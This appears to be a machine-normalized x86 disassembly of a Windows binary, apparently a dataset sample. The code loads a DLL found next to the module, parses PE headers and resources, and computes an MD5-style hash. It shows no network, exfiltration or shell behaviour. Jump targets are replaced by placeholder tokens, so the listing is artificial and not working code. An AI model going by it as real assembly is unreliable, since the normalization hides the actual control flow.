jbe r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ esi ]
mov esi [ esi + 0xc ]
mov ecx [ esp + 0x14 ]
mov [ esp + 0x34 ] eax
cmp esi [ ecx + 0x10 ]
jbe r-xdata
call sub_4407b7
mov ecx [ esp + 0x490 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x478 ]
xor ecx esp
call sub_43f96b
mov esp ebp
pop ebp
retn 0x4
mov edx [ esp + 0x34 ]
mov eax [ ecx ]
push ebx
push edx
push esi
push eax
lea eax [ esp + 0x44 ]
push eax
mov esi ecx
call sub_41d6c0
lea ecx [ esp + 0x1c ]
push ecx
call sub_40f4f0
xor ebx ebx
mov [ esp + 0x498 ] ebx
xor edx edx
mov eax edi
mov [ esp + 0x70 ] 0x7
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] dx
lea ecx [ eax + 0x2 ]
nop
call sub_4407b7
mov ecx [ esp + 0x14 ]
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
mov eax edi
lea esi [ esp + 0x5c ]
call sub_429cc0
lea eax [ esp + 0x1c ]
push eax
push r--data
mov edx esi
mov [ esp + 0x4a0 ] 0x1
call sub_41c960
mov ecx [ esp + 0x2c ]
mov esi [ esp + 0x28 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
xor edi edi
cmp eax ebx
jbe r-xdata
cmp [ esp + 0x70 ] 0x8
jb r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov [ esp + 0x34 ] ebx
cmp edi eax
jb r-xdata
xor edx edx
lea esi [ esp + 0x1c ]
mov [ esp + 0x70 ] 0x7
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] dx
call sub_429670
mov ecx [ esp + 0x5c ]
push ecx
call sub_43f960
add esp 0x4
cmp [ esp + 0x70 ] 0x8
jb r-xdata
cmp [ esp + 0x70 ] 0x8
jb r-xdata
cmp [ ebx + esi + 0x18 ] 0x8
jb r-xdata
call sub_4407b7
mov esi [ esp + 0x28 ]
xor ecx ecx
mov [ esp + 0x70 ] 0x7
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] cx
mov [ esp + 0x498 ] 0xffffffff
cmp esi ebx
je r-xdata
mov eax [ esp + 0x5c ]
push eax
call sub_43f960
mov esi [ esp + 0x2c ]
add esp 0x4
xor edx edx
mov [ esp + 0x70 ] 0x7
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] dx
cmp esi ebx
je r-xdata
mov ecx [ esp + 0x5c ]
push ecx
call sub_43f960
mov esi [ esp + 0x2c ]
add esp 0x4
lea esi [ ebx + esi + 0x4 ]
mov esi [ ebx + esi + 0x4 ]
jmp r-xdata
mov ecx [ esp + 0x1c ]
push ecx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
call sub_43f960
add esp 0x4
push 0x208
lea edx [ esp + 0x280 ]
push ebx
push edx
call sub_443360
add esp 0xc
push 0x208
lea eax [ esp + 0x78 ]
push ebx
push eax
call sub_443360
add esp 0xc
push 0x104
lea ecx [ esp + 0x280 ]
push ecx
push ebx
call [ GetModuleFileNameW@IAT ]
push r--data
lea edx [ esp + 0x280 ]
push edx
lea eax [ esp + 0x7c ]
push eax
call [ PathCombineW@IAT ]
lea ecx [ esp + 0x74 ]
push ecx
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
mov edi [ esp + 0x2c ]
push edx
mov eax esi
call sub_429630
mov eax [ esp + 0x2c ]
add esp 0x4
push eax
call sub_43f960
add esp 0x4
mov edx [ esp + 0x1c ]
push edx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
call sub_43f960
add esp 0x4
xor eax eax
jmp r-xdata
mov eax [ esp + 0x18 ]
mov edi [ esp + 0x2c ]
push eax
mov eax esi
call sub_429630
mov ecx [ esp + 0x2c ]
add esp 0x4
push ecx
call sub_43f960
add esp 0x4
mov ecx [ esp + 0x2c ]
mov esi [ esp + 0x28 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
inc edi
add ebx 0x1c
add eax edx
mov [ esp + 0x34 ] ebx
cmp edi eax
jb r-xdata
cmp eax ecx
je r-xdata
push esi
call sub_441113
add esp 0x4
mov edx rw-data
xor eax eax
jmp r-xdata
lea edx [ esp + 0x74 ]
push edx
call [ LoadLibraryW@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
xor ebx ebx
mov eax [ edx + 0x4 ]
test eax eax
je r-xdata
add edx 0x8
jne r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
cmp eax ebx
jne r-xdata
xor ecx ecx
mov [ esp + 0x40 ] cx
mov ecx eax
mov [ esp + 0x54 ] 0x7
mov [ esp + 0x50 ] 0x0
lea esi [ ecx + 0x2 ]
mov ecx [ edx ]
test ecx ecx
je r-xdata
jmp r-xdata
call eax
mov ecx [ esp + 0x18 ]
xor edx edx
cmp eax ebx
setne dl
mov [ ecx + 0xc ] eax
mov [ ecx + 0x8 ] esi
mov eax edx
mov [ ecx ] eax
push esi
call [ FreeLibrary@IAT ]
xor eax eax
jmp r-xdata
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx esi
sar ecx 0x1
push ecx
lea esi [ esp + 0x40 ]
call sub_429cc0
mov ebx [ esp + 0x14 ]
mov edx esi
push edx
mov [ esp + 0x49c ] 0x2
call sub_428670
mov [ esp + 0x498 ] 0x1
cmp [ esp + 0x54 ] 0x8
jb r-xdata
mov ebx [ esp + 0x34 ]
xor ecx ecx
mov [ esp + 0x54 ] 0x7
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x40 ] cx
mov eax [ esp + 0x40 ]
push eax
call sub_43f960
add esp 0x4
sub_42eae0
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0xc ]
sub esp 0x10
push ebx
xor ebx ebx
push edi
mov [ esi + 0x4 ] ebx
cmp [ esi + 0xc ] ebx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov ecx [ esi + 0x20 ]
sub ecx [ esi + 0x1c ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
xor edi edi
add eax edx
je r-xdata
xor eax eax
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
pop edi
mov [ esi + 0x4 ] edx
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ esp + 0x8 ] ebx
jmp r-xdata
mov ecx [ esi + 0x20 ]
sub ecx [ esi + 0x1c ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ esp + 0xc ] ebx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
cmp edi ecx
jb r-xdata
mov eax [ esi + 0x1c ]
add eax [ esp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_4407b7
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x20 ]
sub ecx [ esi + 0x1c ]
add [ esp + 0x8 ] 0x1c
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
inc edi
add eax edx
cmp edi eax
jb r-xdata
mov ecx [ esp + 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax ] ecx
mov eax [ ebp + 0xc ]
mov edx [ esp + 0x10 ]
add [ eax ] edx
mov ecx [ esp + 0x14 ]
adc [ eax + 0x4 ] ecx
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
lea ebx [ esp + 0x10 ]
push ebx
lea ebx [ esp + 0x10 ]
push ebx
push eax
mov eax [ edx ]
call eax
test eax eax
je r-xdata
xor ebx ebx
sub_42ebf0
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov ecx [ esi + 0x20 ]
sub ecx [ esi + 0x1c ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
push edi
shr eax 0x1f
xor edi edi
add eax edx
je r-xdata
xor eax eax
retn
mov eax 0x1
pop edi
retn
push ebx
xor ebx ebx
lea ebx [ ebx ]
mov eax [ esi + 0x1c ]
add eax ebx
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_4407b7
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x20 ]
sub ecx [ esi + 0x1c ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp edi ecx
jb r-xdata
pop ebx
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ esi + 0x20 ]
sub ecx [ esi + 0x1c ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
inc edi
add ecx edx
add ebx 0x1c
cmp edi ecx
jb r-xdata
sub_42ec90
push ebp
mov ebp [ esp + 0x8 ]
movzx eax [ ebp + 0x14 ]
push esi
lea esi [ eax + ebp + 0x18 ]
mov [ esp + 0xc ] esi
add esi 0xc
cmp ebx [ esi ]
jae r-xdata
movzx ecx [ ebp + 0x6 ]
xor eax eax
push edi
test ecx ecx
jbe r-xdata
pop esi
mov eax ebx
pop ebp
retn
pop edi
pop esi
or eax 0xffffffff
pop ebp
retn
lea esp [ esp ]
mov edi [ esi + 0x28 ]
mov edi [ ebp + 0x50 ]
jmp r-xdata
mov eax edx
add esi 0x28
cmp eax ecx
jb r-xdata
cmp ebx edi
jb r-xdata
cmp ebx [ esi ]
jb r-xdata
lea edx [ eax + 0x1 ]
cmp edx ecx
jne r-xdata
mov edx [ esp + 0x10 ]
lea ecx [ eax + eax * 4 ]
mov eax [ edx + ecx * 8 + 0x14 ]
sub eax [ edx + ecx * 8 + 0xc ]
lea ecx [ edx + ecx * 8 ]
pop edi
pop esi
add eax ebx
pop ebp
retn
sub_42ed00
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_443440
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18c
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x20 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x70 ] 0x0
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor eax eax
push 0x0
lea eax [ ebp - 0x68 ]
push eax
push 0x40
lea ecx [ ebp - 0x64 ]
push ecx
push esi
mov ebx [ ReadFile@IAT ]
call ebx
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
cmp [ ebp - 0x68 ] 0x40
jne r-xdata
mov edx 0x5a4d
cmp [ ebp - 0x64 ] dx
jne r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x28 ]
push eax
push esi
call [ SetFilePointer@IAT ]
cmp eax [ ebp - 0x28 ]
jne r-xdata
push 0x0
lea ecx [ ebp - 0x68 ]
push ecx
push 0xf8
lea edx [ ebp - 0x19c ]
push edx
push esi
call ebx
test eax eax
je r-xdata
cmp [ ebp - 0x68 ] 0xf8
jne r-xdata
cmp [ ebp - 0x19c ] 0x4550
jne r-xdata
cmp [ ebp - 0x196 ] 0x0
je r-xdata
mov eax [ ebp - 0x114 ]
mov [ ebp - 0x7c ] eax
mov ecx [ ebp - 0x110 ]
mov [ ebp - 0x78 ] ecx
test eax eax
je r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
mov [ ebp - 0x68 ] eax
push 0x4
push 0x1000
push eax
push 0x0
call [ VirtualAlloc@IAT ]
mov edi eax
mov [ ebp - 0x6c ] edi
test edi edi
je r-xdata
push 0x0
push 0x0
push 0x0
push esi
call [ SetFilePointer@IAT ]
push 0x0
lea edx [ ebp - 0x68 ]
push edx
mov eax [ ebp - 0x68 ]
push eax
push edi
push esi
call ebx
test eax eax
jne r-xdata
push esi
call [ CloseHandle@IAT ]
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x28 ]
add edi ecx
push edi
mov ebx [ ebp - 0x7c ]
call sub_42ec90
add esp 0x4
mov ebx [ ebp - 0x6c ]
add eax ebx
lea edx [ eax + 0x10 ]
movzx ecx [ eax + 0xe ]
movzx esi [ eax + 0xc ]
add ecx esi
mov [ ebp - 0x80 ] ecx
push 0x8000
push eax
push edi
call [ VirtualFree@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
test [ edx ] 0x80000000
jne r-xdata
test ebx ebx
je r-xdata
add edx 0x8
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
push 0x8000
push 0x0
push ebx
call [ VirtualFree@IAT ]
mov [ ebp - 0x88 ] edx
mov esi ecx
dec ecx
mov [ ebp - 0x80 ] ecx
test esi esi
je r-xdata
mov ecx [ edx + 0x4 ]
and ecx 0x7fffffff
add ecx eax
lea esi [ ecx + 0x10 ]
movzx edx [ ecx + 0xe ]
movzx ecx [ ecx + 0xc ]
add edx ecx
mov [ ebp - 0x84 ] edx
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x20 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn
mov ecx 0x360
cmp [ esi ] cx
jne r-xdata
add esi 0x8
jmp r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jns r-xdata
mov [ ebp - 0x74 ] esi
mov ecx edx
dec edx
mov [ ebp - 0x84 ] edx
test ecx ecx
je r-xdata
add esi eax
xor eax eax
mov [ edi + 0x58 ] eax
mov [ edi + 0x98 ] eax
mov [ edi + 0x9c ] eax
mov [ ebp - 0xa0 ] 0x18
mov [ ebp - 0x9c ] ebx
push edi
mov ebx [ ebp - 0x7c ]
call sub_42ec90
mov [ ebp - 0x98 ] eax
mov eax r--data
mov [ ebp - 0x94 ] eax
mov edx [ esi + 0x4 ]
mov [ ebp - 0x8c ] edx
push edi
mov ebx [ esi ]
call sub_42ec90
add eax [ ebp - 0x6c ]
mov [ ebp - 0x90 ] eax
lea eax [ ebp - 0xa0 ]
push eax
call sub_42efe0
add esp 0xc
mov [ ebp - 0x70 ] eax
mov ebx [ ebp - 0x6c ]
and esi 0x7fffffff
add esi eax
mov esi [ esi + 0x14 ]
sub_42efe0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x194
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x190 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ esp + 0x14 ] eax
test eax eax
je r-xdata
mov ecx [ esp + 0x19c ]
pop edi
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_43f96b
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x18
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ eax + 0x8 ] 0x1
jl r-xdata
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
mov ebx [ eax + 0x14 ]
cmp ebx 0x80
jl r-xdata
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov esi eax
mov ecx 0x40
lea edi [ esp + 0x70 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
push edx
lea eax [ esp + 0x190 ]
mov edi ebx
push eax
lea ecx [ esp + 0x78 ]
lea ebx [ esp + 0x18 ]
mov [ esp + 0x18 ] 0x10
call sub_42fa00
add esp 0x8
test eax eax
jne r-xdata
cmp [ esp + 0x10 ] 0x10
jne r-xdata
lea eax [ esp + 0x18 ]
call sub_42f160
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
push ecx
lea ecx [ esp + 0x1c ]
call sub_42f190
add esp 0x4
lea esi [ esp + 0x18 ]
lea ecx [ esp + 0x17c ]
call sub_42f240
mov eax 0x10
lea ecx [ esp + 0x17c ]
lea edx [ esp + 0x18c ]
movzx eax [ edx ]
movzx esi [ ecx ]
sub eax esi
jne r-xdata
sub eax 0x4
add ecx 0x4
add edx 0x4
cmp eax 0x4
jae r-xdata
sar eax 0x1f
or eax 0x1
jmp r-xdata
movzx eax [ edx + 0x1 ]
movzx esi [ ecx + 0x1 ]
sub eax esi
jne r-xdata
mov esi [ edx ]
cmp esi [ ecx ]
jne r-xdata
xor eax eax
xor ecx ecx
test eax eax
sete cl
mov eax ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x190 ]
xor ecx esp
call sub_43f96b
mov esp ebp
pop ebp
retn
movzx eax [ edx + 0x2 ]
movzx esi [ ecx + 0x2 ]
sub eax esi
jne r-xdata
movzx eax [ edx + 0x3 ]
movzx edx [ ecx + 0x3 ]
sub eax edx
sub_42f190
push esi
push edi
mov edi ecx
mov ecx [ edi + 0x10 ]
mov esi eax
mov eax ecx
shr eax 0x3
lea ecx [ ecx + esi * 8 ]
lea edx [ esi * 8 ]
and eax 0x3f
mov [ edi + 0x10 ] ecx
cmp ecx edx
jae r-xdata
push ebx
mov ecx esi
shr ecx 0x1d
add [ edi + 0x14 ] ecx
mov ebx 0x40
sub ebx eax
push ebp
cmp esi ebx
jb r-xdata
inc [ edi + 0x14 ]
xor ebp ebp
mov ecx [ esp + 0x14 ]
mov ebp ebx
lea eax [ eax + edi + 0x18 ]
test ebx ebx
je r-xdata
pop edi
pop esi
retn
sub eax ecx
lea eax [ edi + 0x18 ]
call sub_42f320
mov ebp ebx
add ebx 0x3f
cmp ebx esi
jae r-xdata
sub eax ecx
lea ebx [ ebx ]
mov dl [ ecx ]
mov [ eax + ecx ] dl
inc ecx
sub esi 0x1
jne r-xdata
xor eax eax
jmp r-xdata
lea esp [ esp ]
mov dl [ ecx ]
mov [ eax + ecx ] dl
inc ecx
sub ebp 0x1
jne r-xdata
mov ecx [ esp + 0x14 ]
sub esi ebp
lea ecx [ ecx + ebp ]
pop ebp
lea eax [ eax + edi + 0x18 ]
pop ebx
je r-xdata
mov eax [ esp + 0x14 ]
lea eax [ eax + ebx - 0x3f ]
call sub_42f320
add ebx 0x40
add ebp 0x40
cmp ebx esi
jb r-xdata
sub_42f240
sub esp 0xc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
push edi
mov edi ecx
xor ecx ecx
lea eax [ esi + 0x12 ]
jmp r-xdata
movzx edx [ eax - 0x2 ]
mov [ esp + ecx + 0x4 ] dl
movzx edx [ eax - 0x1 ]
mov [ esp + ecx + 0x5 ] dl
movzx edx [ eax ]
mov [ esp + ecx + 0x6 ] dl
movzx edx [ eax + 0x1 ]
mov [ esp + ecx + 0x7 ] dl
add ecx 0x4
add eax 0x4
cmp ecx 0x8
jb r-xdata
mov ecx [ esi + 0x10 ]
shr ecx 0x3
and ecx 0x3f
mov eax 0x38
cmp ecx 0x38
jb r-xdata
sub eax ecx
push rw-data
mov ecx esi
call sub_42f190
lea eax [ esp + 0x8 ]
push eax
mov eax 0x8
mov ecx esi
call sub_42f190
lea ecx [ edi + 0x1 ]
add esp 0x8
lea eax [ esi + 0x2 ]
mov edi 0x4
nop
mov eax 0x78
movzx edx [ eax - 0x2 ]
mov [ ecx - 0x1 ] dl
movzx edx [ eax - 0x1 ]
mov [ ecx ] dl
movzx edx [ eax ]
mov [ ecx + 0x1 ] dl
movzx edx [ eax + 0x1 ]
mov [ ecx + 0x2 ] dl
add eax 0x4
add ecx 0x4
sub edi 0x1
jne r-xdata
push 0x58
push edi
push esi
call sub_443360
mov ecx [ esp + 0x18 ]
add esp 0xc
pop edi
xor ecx esp
call sub_43f96b
add esp 0xc
retn
sub_42f320
sub esp 0x48
push ebx
mov ebx [ edi + 0x8 ]
push ebp
mov ebp [ edi + 0xc ]
push esi
mov esi [ edi + 0x4 ]
lea ecx [ esp + 0x14 ]
call sub_42f9c0
mov eax [ edi ]
mov edx ebx
and edx esi
mov ecx esi
not ecx
and ecx ebp
or ecx edx
add ecx eax
mov eax [ esp + 0x14 ]
lea eax [ ecx + eax - 0x28955b88 ]
rol eax 0x7
add eax esi
mov ecx eax
not ecx
and ecx ebx
mov edx esi
and edx eax
or ecx edx
add ecx [ esp + 0x18 ]
lea ecx [ ecx + ebp - 0x173848aa ]
rol ecx 0xc
add ecx eax
mov edx ecx
not edx
and edx esi
mov ebp ecx
and ebp eax
or edx ebp
add edx [ esp + 0x1c ]
mov ebp ecx
lea edx [ edx + ebx + 0x242070db ]
ror edx 0xf
add edx ecx
and ebp edx
mov ebx edx
not ebx
and ebx eax
or ebx ebp
add ebx [ esp + 0x20 ]
mov ebp edx
lea esi [ ebx + esi - 0x3e423112 ]
ror esi 0xa
add esi edx
and ebp esi
mov ebx esi
not ebx
and ebx ecx
or ebx ebp
add ebx [ esp + 0x24 ]
mov ebp esi
lea eax [ ebx + eax - 0xa83f051 ]
rol eax 0x7
add eax esi
and ebp eax
mov ebx eax
not ebx
and ebx edx
or ebx ebp
add ebx [ esp + 0x28 ]
lea ecx [ ebx + ecx + 0x4787c62a ]
rol ecx 0xc
add ecx eax
mov ebx ecx
not ebx
and ebx esi
mov ebp ecx
and ebp eax
or ebx ebp
add ebx [ esp + 0x2c ]
lea edx [ ebx + edx - 0x57cfb9ed ]
ror edx 0xf
add edx ecx
mov ebx edx
not ebx
and ebx eax
mov ebp ecx
and ebp edx
or ebx ebp
add ebx [ esp + 0x30 ]
mov ebp edx
lea esi [ ebx + esi - 0x2b96aff ]
ror esi 0xa
add esi edx
and ebp esi
mov ebx esi
not ebx
and ebx ecx
or ebx ebp
add ebx [ esp + 0x34 ]
mov ebp esi
lea eax [ ebx + eax + 0x698098d8 ]
rol eax 0x7
add eax esi
and ebp eax
mov ebx eax
not ebx
and ebx edx
or ebx ebp
add ebx [ esp + 0x38 ]
lea ecx [ ebx + ecx - 0x74bb0851 ]
rol ecx 0xc
add ecx eax
mov ebx ecx
not ebx
and ebx esi
mov ebp ecx
and ebp eax
or ebx ebp
add ebx [ esp + 0x3c ]
mov ebp ecx
lea edx [ ebx + edx - 0xa44f ]
ror edx 0xf
add edx ecx
and ebp edx
mov ebx edx
not ebx
and ebx eax
or ebx ebp
add ebx [ esp + 0x40 ]
mov ebp edx
lea esi [ ebx + esi - 0x76a32842 ]
ror esi 0xa
add esi edx
and ebp esi
mov ebx esi
not ebx
and ebx ecx
or ebx ebp
add ebx [ esp + 0x44 ]
mov ebp esi
lea eax [ ebx + eax + 0x6b901122 ]
rol eax 0x7
add eax esi
and ebp eax
mov ebx eax
not ebx
and ebx edx
or ebx ebp
add ebx [ esp + 0x48 ]
lea ecx [ ebx + ecx - 0x2678e6d ]
rol ecx 0xc
add ecx eax
mov ebx ecx
not ebx
mov [ esp + 0xc ] ebx
and ebx esi
mov ebp ecx
and ebp eax
or ebx ebp
add ebx [ esp + 0x4c ]
lea edx [ ebx + edx - 0x5986bc72 ]
ror edx 0xf
add edx ecx
mov ebx edx
not ebx
mov [ esp + 0x10 ] ebx
and ebx eax
mov ebp ecx
and ebp edx
or ebx ebp
add ebx [ esp + 0x50 ]
mov ebp ecx
lea esi [ ebx + esi + 0x49b40821 ]
mov ebx [ esp + 0xc ]
and ebx edx
ror esi 0xa
add esi edx
and ebp esi
or ebx ebp
add ebx [ esp + 0x18 ]
mov ebp edx
lea eax [ ebx + eax - 0x9e1da9e ]
mov ebx [ esp + 0x10 ]
and ebx esi
rol eax 0x5
add eax esi
and ebp eax
or ebx ebp
add ebx [ esp + 0x2c ]
lea ecx [ ebx + ecx - 0x3fbf4cc0 ]
rol ecx 0x9
add ecx eax
mov ebx esi
not ebx
and ebx eax
mov ebp ecx
and ebp esi
or ebx ebp
add ebx [ esp + 0x40 ]
lea edx [ ebx + edx + 0x265e5a51 ]
rol edx 0xe
add edx ecx
mov ebx eax
not ebx
and ebx ecx
mov ebp edx
and ebp eax
or ebx ebp
add ebx [ esp + 0x14 ]
mov ebp ecx
lea esi [ ebx + esi - 0x16493856 ]
ror esi 0xc
add esi edx
and ebp esi
mov ebx ecx
not ebx
and ebx edx
or ebx ebp
add ebx [ esp + 0x28 ]
mov ebp edx
lea eax [ ebx + eax - 0x29d0efa3 ]
rol eax 0x5
add eax esi
mov ebx edx
not ebx
and ebx esi
and ebp eax
or ebx ebp
add ebx [ esp + 0x3c ]
lea ecx [ ebx + ecx + 0x2441453 ]
rol ecx 0x9
add ecx eax
mov ebx esi
not ebx
and ebx eax
mov ebp ecx
and ebp esi
or ebx ebp
add ebx [ esp + 0x50 ]
lea edx [ ebx + edx - 0x275e197f ]
rol edx 0xe
mov ebx eax
not ebx
add edx ecx
and ebx ecx
mov ebp edx
and ebp eax
or ebx ebp
add ebx [ esp + 0x24 ]
mov ebp ecx
lea esi [ ebx + esi - 0x182c0438 ]
ror esi 0xc
add esi edx
and ebp esi
mov ebx ecx
not ebx
and ebx edx
or ebx ebp
add ebx [ esp + 0x38 ]
mov ebp edx
lea eax [ ebx + eax + 0x21e1cde6 ]
rol eax 0x5
add eax esi
and ebp eax
mov ebx edx
not ebx
and ebx esi
or ebx ebp
add ebx [ esp + 0x4c ]
lea ecx [ ebx + ecx - 0x3cc8f82a ]
rol ecx 0x9
add ecx eax
mov ebx esi
not ebx
and ebx eax
mov ebp ecx
and ebp esi
or ebx ebp
add ebx [ esp + 0x20 ]
lea edx [ ebx + edx - 0xb2af279 ]
rol edx 0xe
add edx ecx
mov ebx eax
not ebx
and ebx ecx
mov ebp edx
and ebp eax
or ebx ebp
add ebx [ esp + 0x34 ]
mov ebp ecx
lea esi [ ebx + esi + 0x455a14ed ]
ror esi 0xc
add esi edx
and ebp esi
mov ebx ecx
not ebx
and ebx edx
or ebx ebp
add ebx [ esp + 0x48 ]
mov ebp edx
lea eax [ ebx + eax - 0x561c16fb ]
rol eax 0x5
add eax esi
mov ebx edx
not ebx
and ebx esi
and ebp eax
or ebx ebp
add ebx [ esp + 0x1c ]
lea ecx [ ebx + ecx - 0x3105c08 ]
rol ecx 0x9
add ecx eax
mov ebx esi
not ebx
and ebx eax
mov ebp ecx
and ebp esi
or ebx ebp
add ebx [ esp + 0x30 ]
lea edx [ ebx + edx + 0x676f02d9 ]
rol edx 0xe
mov ebx eax
add edx ecx
not ebx
and ebx ecx
mov ebp edx
and ebp eax
or ebx ebp
add ebx [ esp + 0x44 ]
lea esi [ ebx + esi - 0x72d5b376 ]
ror esi 0xc
add esi edx
mov ebx ecx
xor ebx edx
xor ebx esi
add ebx [ esp + 0x28 ]
lea eax [ ebx + eax - 0x5c6be ]
rol eax 0x4
add eax esi
mov ebx edx
xor ebx esi
xor ebx eax
add ebx [ esp + 0x34 ]
lea ebx [ ebx + ecx - 0x788e097f ]
rol ebx 0xb
add ebx eax
mov ecx ebx
xor ecx esi
xor ecx eax
add ecx [ esp + 0x40 ]
mov ebp ebx
lea edx [ ecx + edx + 0x6d9d6122 ]
rol edx 0x10
add edx ebx
xor ebp edx
mov ecx ebp
xor ecx eax
add ecx [ esp + 0x4c ]
lea ecx [ ecx + esi - 0x21ac7f4 ]
ror ecx 0x9
add ecx edx
xor ebp ecx
add ebp [ esp + 0x18 ]
mov esi edx
xor esi ecx
lea eax [ eax + ebp - 0x5b4115bc ]
rol eax 0x4
add eax ecx
xor esi eax
add esi [ esp + 0x24 ]
lea esi [ esi + ebx + 0x4bdecfa9 ]
rol esi 0xb
add esi eax
mov ebx esi
xor ebx ecx
xor ebx eax
add ebx [ esp + 0x30 ]
lea edx [ ebx + edx - 0x944b4a0 ]
rol edx 0x10
add edx esi
mov ebx esi
xor ebx edx
mov ebp ebx
xor ebp eax
add ebp [ esp + 0x3c ]
lea ecx [ ecx + ebp - 0x41404390 ]
ror ecx 0x9
add ecx edx
xor ebx ecx
add ebx [ esp + 0x48 ]
lea eax [ ebx + eax + 0x289b7ec6 ]
rol eax 0x4
add eax ecx
mov ebx edx
xor ebx ecx
xor ebx eax
add ebx [ esp + 0x14 ]
lea esi [ ebx + esi - 0x155ed806 ]
rol esi 0xb
add esi eax
mov ebx esi
xor ebx ecx
xor ebx eax
add ebx [ esp + 0x20 ]
lea ebx [ ebx + edx - 0x2b10cf7b ]
rol ebx 0x10
add ebx esi
mov edx esi
xor edx ebx
mov ebp edx
xor ebp eax
add ebp [ esp + 0x2c ]
lea ecx [ ecx + ebp + 0x4881d05 ]
ror ecx 0x9
add ecx ebx
xor edx ecx
add edx [ esp + 0x38 ]
lea eax [ edx + eax - 0x262b2fc7 ]
mov edx ebx
xor edx ecx
rol eax 0x4
add eax ecx
xor edx eax
add edx [ esp + 0x44 ]
lea edx [ edx + esi - 0x1924661b ]
rol edx 0xb
add edx eax
mov esi edx
xor esi ecx
xor esi eax
add esi [ esp + 0x50 ]
lea esi [ esi + ebx + 0x1fa27cf8 ]
rol esi 0x10
add esi edx
mov ebx edx
xor ebx esi
xor ebx eax
add ebx [ esp + 0x1c ]
lea ecx [ ebx + ecx - 0x3b53a99b ]
ror ecx 0x9
add ecx esi
